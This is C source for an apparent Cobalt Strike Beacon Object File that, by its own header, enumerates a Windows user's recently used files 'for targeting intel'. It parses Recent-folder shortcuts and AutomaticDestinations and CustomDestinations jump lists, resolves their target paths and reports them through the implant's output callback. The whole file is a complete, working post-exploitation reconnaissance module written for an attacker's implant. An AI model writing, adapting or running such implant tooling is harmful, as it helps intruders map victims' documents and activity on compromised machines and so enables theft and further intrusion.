/*
 * bof-recentfiles [extra-dir]
 *
 * Enumerate recently used files for targeting intel:
 *   - %APPDATA%\Microsoft\Windows\Recent\*.lnk  (with target resolution)
 *   - AutomaticDestinations jump lists: the OLE compound file is parsed, each
 *     numbered stream's embedded Shell Link is decoded, and DestList path
 *     strings are listed
 *   - CustomDestinations jump lists: embedded Shell Links and path strings
 *   - an optional extra directory
 *
 * LNK targets come from the LinkInfo block.  Links that only carry an IDList
 * are reported without a target.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

#define CFB_MAX_FILE (32u * 1024u * 1024u)

static unsigned int le16(const unsigned char *p) { return p[0] | ((unsigned int)p[1] << 8); }
static unsigned int le32(const unsigned char *p)
{
    return p[0] | ((unsigned int)p[1] << 8) | ((unsigned int)p[2] << 16) |
           ((unsigned int)p[3] << 24);
}
static unsigned long long le64(const unsigned char *p)
{
    return (unsigned long long)le32(p) | ((unsigned long long)le32(p + 4) << 32);
}

/* Extract the local base path + common suffix out of a .lnk file. */
static int lnk_target(const unsigned char *b, unsigned int n, char *out, int outsz)
{
    unsigned int flags, off, li, lisize, hdrsize;
    unsigned int lbp, cps, lbpu = 0, cpsu = 0;

    out[0] = 0;
    if (n < 0x4c || le32(b) != 0x4c ||
        b[4] != 0x4c || b[5] != 0x00 || b[6] != 0x00 || b[7] != 0x00)
        return -1;

    flags = le32(b + 0x14);
    if (!(flags & 0x02)) return -1;      /* no LinkInfo */

    off = 0x4c;
    if (flags & 0x01) {                  /* LinkTargetIDList first */
        if (off + 2 > n) return -1;
        off += 2 + le16(b + off);
    }
    if (off + 0x1c > n) return -1;
    li = off;
    lisize = le32(b + li);
    hdrsize = le32(b + li + 4);
    if (lisize < 0x1c || li + lisize > n) return -1;

    lbp = le32(b + li + 16);
    cps = le32(b + li + 20);
    if (hdrsize >= 0x24 && li + 28 <= n) {
        lbpu = le32(b + li + 24);
        cpsu = le32(b + li + 28);
    }

    if (lbpu && li + lbpu < li + lisize) {
        wchar_t w[512];
        int i;
        for (i = 0; i < 511; i++) {
            unsigned char lo = b[li + lbpu + i * 2];
            unsigned char hi = b[li + lbpu + i * 2 + 1];
            if (li + lbpu + i * 2 + 1 >= li + lisize) break;
            w[i] = (wchar_t)(lo | ((unsigned short)hi << 8));
            if (!w[i]) break;
        }
        w[i] = 0;
        bof_w2a(w, out, outsz);
        if (cpsu && li + cpsu < li + lisize) {
            for (i = 0; i < 511; i++) {
                unsigned char lo = b[li + cpsu + i * 2];
                unsigned char hi = b[li + cpsu + i * 2 + 1];
                if (li + cpsu + i * 2 + 1 >= li + lisize) break;
                w[i] = (wchar_t)(lo | ((unsigned short)hi << 8));
                if (!w[i]) break;
            }
            w[i] = 0;
            bof_strncat(out, "\\", outsz - bof_strlen(out) - 1);
            {
                char suffix[512];
                bof_w2a(w, suffix, sizeof(suffix));
                bof_strncat(out, suffix, outsz - bof_strlen(out) - 1);
            }
        }
        return out[0] ? 0 : -1;
    }

    if (lbp && li + lbp < li + lisize) {
        int i = 0;
        while (li + lbp + i < li + lisize && b[li + lbp + i] &&
               i < outsz - 1) {
            out[i] = (char)b[li + lbp + i];
            i++;
        }
        out[i] = 0;
        if (cps && li + cps < li + lisize) {
            bof_strncat(out, "\\", outsz - bof_strlen(out) - 1);
            i = 0;
            while (li + cps + i < li + lisize && b[li + cps + i] && i < 255) {
                char one[2];
                one[0] = (char)b[li + cps + i];
                one[1] = 0;
                bof_strncat(out, one, outsz - bof_strlen(out) - 1);
                i++;
            }
        }
        return out[0] ? 0 : -1;
    }
    return -1;
}

static unsigned int find_lnk(const unsigned char *b, unsigned int n)
{
    unsigned int i;
    for (i = 0; i + 20 <= n; i++) {
        if (b[i] == 0x4c && b[i + 1] == 0 && b[i + 2] == 0 &&
            b[i + 3] == 0 && b[i + 4] == 0x01 && b[i + 5] == 0x14 &&
            b[i + 6] == 0x02 && b[i + 7] == 0x00)
            return i;
    }
    return 0xffffffffu;
}

/* Heuristic: print unique UTF-16LE strings that look like file paths. */
static void scan_utf16_paths(const unsigned char *b, unsigned int n,
                             const char *label, int limit)
{
    unsigned int i = 0;
    int shown = 0;

    while (i + 8 <= n && shown < limit) {
        unsigned int start, len = 0, j;
        char tmp[520];
        int has_slash = 0, printable = 1;

        if ((b[i + 1] != 0) || b[i] < 0x20 || b[i] >= 0x7f) { i += 2; continue; }
        start = i;
        while (i + 1 < n && b[i + 1] == 0 && b[i] >= 0x20 && b[i] < 0x7f) {
            len++;
            i += 2;
            if (len >= 259) break;
        }
        if (len < 4 || len > 259) continue;
        for (j = 0; j < len; j++) {
            unsigned char c = b[start + j * 2];
            tmp[j] = (char)c;
            if (c == '\\') has_slash = 1;
        }
        tmp[len] = 0;
        if (!has_slash || !printable) continue;
        if (!bof_strchr(tmp, ':') && !(len > 2 && tmp[0] == '\\' && tmp[1] == '\\'))
            continue;
        BeaconPrintf(CALLBACK_OUTPUT, "      %s: %s\n", label, tmp);
        shown++;
    }
}

/* ------------------------------------------------------------------ */
/* OLE compound file (CFB) reader for AutomaticDestinations           */
/* ------------------------------------------------------------------ */
typedef struct {
    unsigned char *file;
    unsigned int size;
    unsigned int ssize, mssize, cutoff;
    unsigned int *fat;
    unsigned int fatn;
    unsigned int *mfat;
    unsigned int mfatn;
    unsigned char *dir;
    unsigned int dirsize;
    unsigned char *mini;
    unsigned int minisize;
} cfb;

static int cfb_open(const char *path, cfb *c)
{
    const unsigned char *h;
    unsigned int nfat, dirsect, minifat, nminifat, difat, ndifat;
    unsigned int cap, i, s;
    unsigned int difat_entries[109];

    bof_memzero(c, sizeof(*c));
    if (bof_read_file(path, &c->file, &c->size) != 0 || !c->file) return -1;
    if (c->size < 512 || c->size > CFB_MAX_FILE) goto fail;
    h = c->file;
    if (h[0] != 0xd0 || h[1] != 0xcf || h[2] != 0x11 || h[3] != 0xe0 ||
        h[4] != 0xa1 || h[5] != 0xb1 || h[6] != 0x1a || h[7] != 0xe1)
        goto fail;

    c->ssize = 1u << le16(h + 0x1e);
    c->mssize = 1u << le16(h + 0x20);
    c->cutoff = le32(h + 0x38);
    if (c->ssize < 128 || c->ssize > 65536 ||
        c->mssize < 16 || c->mssize > 4096)
        goto fail;

    nfat      = le32(h + 0x2c);
    dirsect   = le32(h + 0x30);
    minifat   = le32(h + 0x3c);
    nminifat  = le32(h + 0x40);
    difat     = le32(h + 0x44);
    ndifat    = le32(h + 0x48);

    for (i = 0; i < 109; i++) difat_entries[i] = le32(h + 0x4c + i * 4);

    cap = c->size / c->ssize + 2;
    c->fat = (unsigned int *)KERNEL32$VirtualAlloc(NULL, cap * 4,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!c->fat) goto fail;
    c->fatn = 0;

    for (i = 0; i < 109 && c->fatn < nfat; i++) {
        unsigned int fs = difat_entries[i], k;
        unsigned int off;
        if (fs >= 0xfffffffa) continue;
        off = (fs + 1) * c->ssize;
        if (off + c->ssize > c->size) continue;
        for (k = 0; k < c->ssize / 4 && c->fatn < cap; k++)
            c->fat[c->fatn++] = le32(c->file + off + k * 4);
    }
    s = difat;
    while (s < 0xfffffffa && ndifat--) {
        unsigned int off = (s + 1) * c->ssize, k;
        if (off + c->ssize > c->size) break;
        for (k = 0; k + 1 < c->ssize / 4 && c->fatn < nfat; k++)
            c->fat[c->fatn++] = le32(c->file + off + k * 4);
        s = le32(c->file + off + c->ssize - 4);
    }

    /* Directory chain. */
    {
        unsigned int need = 0, sect = dirsect, guard = 0;
        while (sect < 0xfffffffa && guard++ < cap) { need++; sect = (sect < c->fatn) ? c->fat[sect] : 0xfffffffe; }
        c->dir = (unsigned char *)KERNEL32$VirtualAlloc(NULL,
                    need * c->ssize + c->ssize, MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE);
        if (!c->dir) goto fail;
        sect = dirsect; c->dirsize = 0; guard = 0;
        while (sect < 0xfffffffa && guard++ < cap) {
            unsigned int off = (sect + 1) * c->ssize;
            if (off + c->ssize > c->size) break;
            bof_memcpy(c->dir + c->dirsize, c->file + off, c->ssize);
            c->dirsize += c->ssize;
            sect = (sect < c->fatn) ? c->fat[sect] : 0xfffffffe;
        }
    }
    if (c->dirsize < 128) goto fail;

    /* MiniFAT chain. */
    if (nminifat && minifat < 0xfffffffa) {
        unsigned int need = 0, sect = minifat, guard = 0;
        while (sect < 0xfffffffa && guard++ < cap) { need++; sect = (sect < c->fatn) ? c->fat[sect] : 0xfffffffe; }
        c->mfat = (unsigned int *)KERNEL32$VirtualAlloc(NULL, need * c->ssize + 4,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!c->mfat) goto fail;
        sect = minifat; c->mfatn = 0; guard = 0;
        while (sect < 0xfffffffa && guard++ < cap) {
            unsigned int off = (sect + 1) * c->ssize, k;
            if (off + c->ssize > c->size) break;
            for (k = 0; k < c->ssize / 4; k++)
                c->mfat[c->mfatn++] = le32(c->file + off + k * 4);
            sect = (sect < c->fatn) ? c->fat[sect] : 0xfffffffe;
        }
    }

    /* Root entry: find the mini stream. */
    for (i = 0; i + 128 <= c->dirsize; i += 128) {
        const unsigned char *e = c->dir + i;
        if (e[0x42] == 5) {
            unsigned int start = le32(e + 0x74);
            unsigned long long sz = le64(e + 0x78);
            if (sz && sz < CFB_MAX_FILE) {
                unsigned int need = (unsigned int)((sz + c->ssize - 1) / c->ssize);
                unsigned int sect = start, guard = 0, got = 0;
                c->minisize = (unsigned int)sz;
                c->mini = (unsigned char *)KERNEL32$VirtualAlloc(NULL,
                            need * c->ssize + c->ssize,
                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!c->mini) goto fail;
                while (sect < 0xfffffffa && got < need && guard++ < cap) {
                    unsigned int off = (sect + 1) * c->ssize;
                    if (off + c->ssize > c->size) break;
                    bof_memcpy(c->mini + got * c->ssize, c->file + off, c->ssize);
                    got++;
                    sect = (sect < c->fatn) ? c->fat[sect] : 0xfffffffe;
                }
            }
            break;
        }
    }
    return 0;

fail:
    if (c->file) KERNEL32$VirtualFree(c->file, 0, MEM_RELEASE);
    if (c->fat) KERNEL32$VirtualFree(c->fat, 0, MEM_RELEASE);
    if (c->mfat) KERNEL32$VirtualFree(c->mfat, 0, MEM_RELEASE);
    if (c->dir) KERNEL32$VirtualFree(c->dir, 0, MEM_RELEASE);
    if (c->mini) KERNEL32$VirtualFree(c->mini, 0, MEM_RELEASE);
    bof_memzero(c, sizeof(*c));
    return -1;
}

static void cfb_close(cfb *c)
{
    if (c->file) KERNEL32$VirtualFree(c->file, 0, MEM_RELEASE);
    if (c->fat) KERNEL32$VirtualFree(c->fat, 0, MEM_RELEASE);
    if (c->mfat) KERNEL32$VirtualFree(c->mfat, 0, MEM_RELEASE);
    if (c->dir) KERNEL32$VirtualFree(c->dir, 0, MEM_RELEASE);
    if (c->mini) KERNEL32$VirtualFree(c->mini, 0, MEM_RELEASE);
    bof_memzero(c, sizeof(*c));
}

static void entry_name(const unsigned char *e, char *out, int outsz)
{
    unsigned int len = le16(e + 0x40);
    unsigned int i, o = 0;
    if (len > 64) len = 64;
    for (i = 0; i + 1 < len && o < (unsigned int)outsz - 1; i += 2) {
        unsigned char c = e[i];
        if (!c) break;
        out[o++] = (c >= 0x20 && c < 0x7f) ? (char)c : '?';
    }
    out[o] = 0;
}

static int cfb_stream(cfb *c, unsigned int start, unsigned long long sz,
                      unsigned char **out, unsigned int *outlen)
{
    unsigned int need, sect, got = 0, guard = 0;
    int mini = (sz && sz < c->cutoff);

    *out = NULL;
    *outlen = 0;
    if (!sz || sz > CFB_MAX_FILE) return -1;
    need = (unsigned int)((sz + (mini ? c->mssize : c->ssize) - 1) /
                          (mini ? c->mssize : c->ssize));
    *out = (unsigned char *)KERNEL32$VirtualAlloc(NULL,
                need * (mini ? c->mssize : c->ssize) + 8,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*out) return -1;

    sect = start;
    while (sect < 0xfffffffa && got < need && guard++ < need + 32) {
        if (mini) {
            unsigned int off = sect * c->mssize;
            if (!c->mini || off + c->mssize > c->minisize) break;
            bof_memcpy(*out + got * c->mssize, c->mini + off, c->mssize);
            sect = (sect < c->mfatn) ? c->mfat[sect] : 0xfffffffe;
        } else {
            unsigned int off = (sect + 1) * c->ssize;
            if (off + c->ssize > c->size) break;
            bof_memcpy(*out + got * c->ssize, c->file + off, c->ssize);
            sect = (sect < c->fatn) ? c->fat[sect] : 0xfffffffe;
        }
        got++;
    }
    if (!got) {
        KERNEL32$VirtualFree(*out, 0, MEM_RELEASE);
        *out = NULL;
        return -1;
    }
    *outlen = (unsigned int)((sz < (unsigned long long)got * (mini ? c->mssize : c->ssize))
                             ? sz : (unsigned long long)got * (mini ? c->mssize : c->ssize));
    return 0;
}

static void parse_automatic(const char *path, const char *name)
{
    cfb c;
    unsigned int i;
    int printed = 0;

    if (cfb_open(path, &c) != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s (unreadable compound file)\n", name);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", name);
    for (i = 0; i + 128 <= c.dirsize; i += 128) {
        const unsigned char *e = c.dir + i;
        char ename[64];
        unsigned char *st = NULL;
        unsigned int stlen = 0, off;
        char target[1024];

        if (e[0x42] != 2) continue;
        entry_name(e, ename, sizeof(ename));
        if (!ename[0] || ename[0] < '0' || ename[0] > '9') continue;
        if (cfb_stream(&c, le32(e + 0x74), le64(e + 0x78), &st, &stlen) != 0)
            continue;
        off = find_lnk(st, stlen);
        target[0] = 0;
        if (off != 0xffffffffu)
            lnk_target(st + off, stlen - off, target, sizeof(target));
        BeaconPrintf(CALLBACK_OUTPUT, "      stream %s (%u bytes)%s%s\n",
                     ename, stlen, target[0] ? " -> " : "",
                     target[0] ? target : "");
        KERNEL32$VirtualFree(st, 0, MEM_RELEASE);
        printed++;
    }

    for (i = 0; i + 128 <= c.dirsize; i += 128) {
        const unsigned char *e = c.dir + i;
        char ename[64];
        unsigned char *st = NULL;
        unsigned int stlen = 0;

        if (e[0x42] != 2) continue;
        entry_name(e, ename, sizeof(ename));
        if (bof_stricmp(ename, "DestList") != 0) continue;
        if (cfb_stream(&c, le32(e + 0x74), le64(e + 0x78), &st, &stlen) != 0)
            continue;
        scan_utf16_paths(st, stlen, "dest", 20);
        KERNEL32$VirtualFree(st, 0, MEM_RELEASE);
        printed++;
    }

    if (!printed)
        BeaconPrintf(CALLBACK_OUTPUT, "      (no numbered streams / DestList)\n");
    cfb_close(&c);
}

static void parse_custom(const char *path, const char *name)
{
    unsigned char *b = NULL;
    unsigned int n = 0, at = 0;
    int shown = 0;

    if (bof_read_file(path, &b, &n) != 0 || !b) {
        BeaconPrintf(CALLBACK_OUTPUT, "  %s (unreadable)\n", name);
        return;
    }
    if (n > CFB_MAX_FILE) {
        KERNEL32$VirtualFree(b, 0, MEM_RELEASE);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "  %s\n", name);
    while (at + 20 <= n && shown < 40) {
        unsigned int off = find_lnk(b + at, n - at);
        char target[1024];
        if (off == 0xffffffffu) break;
        off += at;
        target[0] = 0;
        lnk_target(b + off, n - off, target, sizeof(target));
        if (target[0]) {
            BeaconPrintf(CALLBACK_OUTPUT, "      entry -> %s\n", target);
            shown++;
        }
        at = off + 4;
    }
    scan_utf16_paths(b, n, "dest", 20);
    if (!shown)
        BeaconPrintf(CALLBACK_OUTPUT, "      (no embedded LNK target)\n");
    KERNEL32$VirtualFree(b, 0, MEM_RELEASE);
}

static int ends_with_ci(const char *s, const char *suffix)
{
    int n = bof_strlen(s), m = bof_strlen(suffix);
    return n >= m && bof_stricmp(s + n - m, suffix) == 0;
}

static void print_lnk(const char *path, const char *name,
                      const WIN32_FIND_DATAA *fd)
{
    unsigned char *data = NULL;
    unsigned int size = 0;
    char target[1024];
    char when[32];

    bof_ft_str(((unsigned long long)fd->ftLastWriteTime.dwHighDateTime << 32) |
               fd->ftLastWriteTime.dwLowDateTime, when, sizeof(when));

    target[0] = 0;
    if (bof_read_file(path, &data, &size) == 0) {
        lnk_target(data, size, target, sizeof(target));
        KERNEL32$VirtualFree(data, 0, MEM_RELEASE);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "  %-40.40s %s\n", name, when);
    if (target[0])
        BeaconPrintf(CALLBACK_OUTPUT, "      -> %s\n", target);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "      -> (target only in IDList)\n");
}

static void scan_dir(const char *dir, int mode, int limit, int *shown)
{
    char pattern[MAX_PATH + 8], path[MAX_PATH + 8];
    WIN32_FIND_DATAA fd;
    HANDLE h;

    bof_strncpy(pattern, dir, sizeof(pattern));
    bof_strncat(pattern, "\\*", sizeof(pattern) - bof_strlen(pattern) - 1);
    h = KERNEL32$FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (bof_strcmp(fd.cFileName, ".") == 0 ||
            bof_strcmp(fd.cFileName, "..") == 0)
            continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        if (*shown >= limit) break;

        if (mode == 1) {
            int n = bof_strlen(fd.cFileName);
            if (n < 4 || bof_stricmp(fd.cFileName + n - 4, ".lnk") != 0)
                continue;
        }

        bof_strncpy(path, dir, sizeof(path));
        bof_strncat(path, "\\", sizeof(path) - bof_strlen(path) - 1);
        bof_strncat(path, fd.cFileName, sizeof(path) - bof_strlen(path) - 1);

        if (mode == 1) {
            print_lnk(path, fd.cFileName, &fd);
        } else if (mode == 2) {
            if (ends_with_ci(fd.cFileName, ".automaticDestinations-ms"))
                parse_automatic(path, fd.cFileName);
            else if (ends_with_ci(fd.cFileName, ".customDestinations-ms"))
                parse_custom(path, fd.cFileName);
            else {
                char when[32];
                bof_ft_str(((unsigned long long)fd.ftLastWriteTime.dwHighDateTime << 32) |
                           fd.ftLastWriteTime.dwLowDateTime, when, sizeof(when));
                BeaconPrintf(CALLBACK_OUTPUT, "  %-48.48s %s\n", fd.cFileName, when);
            }
        } else {
            char when[32];
            bof_ft_str(((unsigned long long)fd.ftLastWriteTime.dwHighDateTime << 32) |
                       fd.ftLastWriteTime.dwLowDateTime, when, sizeof(when));
            BeaconPrintf(CALLBACK_OUTPUT, "  %-48.48s %s\n", fd.cFileName, when);
        }
        (*shown)++;
    } while (KERNEL32$FindNextFileA(h, &fd));

    KERNEL32$FindClose(h);
}

void go(char *args, int alen)
{
    datap parser;
    char *extra = "";
    int elen = 0, shown = 0;
    char base[512], sub[512];

    BeaconDataParse(&parser, args, alen);
    extra = BeaconDataExtract(&parser, &elen);
    if (!extra) extra = "";

    BeaconPrintf(CALLBACK_OUTPUT, "================ recent files ================\n");

    if (KERNEL32$ExpandEnvironmentStringsA(
            "%APPDATA%\\Microsoft\\Windows\\Recent", base, sizeof(base))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s\n", base);
        scan_dir(base, 1, 200, &shown);

        bof_strncpy(sub, base, sizeof(sub));
        bof_strncat(sub, "\\AutomaticDestinations", sizeof(sub) - bof_strlen(sub) - 1);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s (jump lists)\n", sub);
        scan_dir(sub, 2, 40, &shown);

        bof_strncpy(sub, base, sizeof(sub));
        bof_strncat(sub, "\\CustomDestinations", sizeof(sub) - bof_strlen(sub) - 1);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s (jump lists)\n", sub);
        scan_dir(sub, 2, 40, &shown);
    }

    if (extra[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] %s\n", extra);
        scan_dir(extra, 0, 100, &shown);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d entr%s\n", shown, shown == 1 ? "y" : "ies");
}
